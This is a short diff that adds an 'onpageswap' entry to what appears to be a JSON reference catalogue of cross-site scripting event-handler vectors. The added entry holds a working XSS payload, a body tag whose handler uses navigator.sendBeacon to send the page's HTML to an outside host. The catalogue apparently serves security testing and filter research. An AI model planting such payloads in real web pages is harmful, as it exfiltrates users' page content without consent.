@@ -6430,5 +6430,16 @@
         "interaction": false
       }
     ]
+  },
+  "onpageswap": {
+    "description": "Fires when the page reloads",
+    "tags": [
+      {
+        "tag": "body",
+        "code": "<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
+        "browsers": ["safari"],
+        "interaction": true
+      }
+    ]
   }
 }
